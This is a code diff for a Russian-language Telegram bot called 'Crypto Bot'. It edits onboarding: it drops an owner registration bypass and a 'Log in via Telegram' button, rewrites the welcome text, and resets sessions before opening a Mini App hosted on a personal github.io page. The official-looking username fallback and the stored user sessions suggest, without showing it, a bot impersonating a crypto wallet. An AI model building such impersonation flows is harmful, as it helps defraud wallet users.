@@ -187,10 +187,8 @@ async def cmd_start(msg: Message, state: FSMContext):
     from database import get_user, is_user_registered
     user = await get_user(msg.from_user.id)
     user_registered = await is_user_registered(msg.from_user.id)
-    if msg.from_user.id == config.OWNER_ID:
-        user_registered = True
 
-    if msg.from_user.id == config.OWNER_ID or user_registered or (user and user["is_onboarded"]):
+    if user_registered or (user and user.get("is_onboarded")):
         # Maintain persistent session in data/sessions
         try:
             from sessions import create_session
@@ -220,13 +218,12 @@ async def cmd_start(msg: Message, state: FSMContext):
     img_path = os.path.join(BASE_DIR, "welcome.jpg")
     text = (
         '<tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> <b>Добро пожаловать в Crypto Bot</b>\n\n'
-        "Кошелёк готов к работе. Войдите через Telegram для мгновенного доступа ко всем возможностям без ввода паролей."
+        "Кошелёк готов к работе. Нажмите кнопку ниже для быстрого входа в приложение."
     )
     bot_me = await msg.bot.get_me()
     bot_username = bot_me.username or config.BOT_USERNAME or "CryptoBotOfficialbot"
     webapp_url = f"https://flows3039-png.github.io/cryptobot-tg/?mode=reg&uid={msg.from_user.id}&t={int(time.time())}"
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Войти через Telegram", callback_data="onb:quick_start")],
         [InlineKeyboardButton(text="Открыть Mini App", web_app=WebAppInfo(url=webapp_url))]
     ])
     
@@ -709,13 +706,15 @@ async def cmd_testreg(msg: Message, state: FSMContext):
         
         bot_me = await msg.bot.get_me()
         bot_username = bot_me.username or config.BOT_USERNAME or "CryptoBotOfficialbot"
-        webapp_url = f"https://flows3039-png.github.io/cryptobot-tg/?mode=reg&uid={msg.from_user.id}&t={int(time.time())}"
+        from sessions import delete_user_sessions
+        delete_user_sessions(msg.from_user.id)
+
+        webapp_url = f"https://flows3039-png.github.io/cryptobot-tg/?mode=reg&reset=1&uid={msg.from_user.id}&t={int(time.time())}"
         text = (
-            '<tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> <b>Добро пожаловать в Crypto Bot</b>\n\n'
-            "Кошелёк готов к работе. Войдите через Telegram для мгновенного доступа ко всем возможностям без ввода паролей."
+            '<tg-emoji emoji-id="5361914370068613491">🦋</tg-emoji> <b>Добро пожаловать в Modrix Crypto Bot</b>\n\n'
+            "Нажмите кнопку ниже, чтобы открыть приложение и начать работу."
         )
         kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Войти через Telegram", callback_data="onb:quick_start")],
             [InlineKeyboardButton(text="Открыть Mini App", web_app=WebAppInfo(url=webapp_url))]
         ])
         img_path = os.path.join(BASE_DIR, "welcome.jpg")
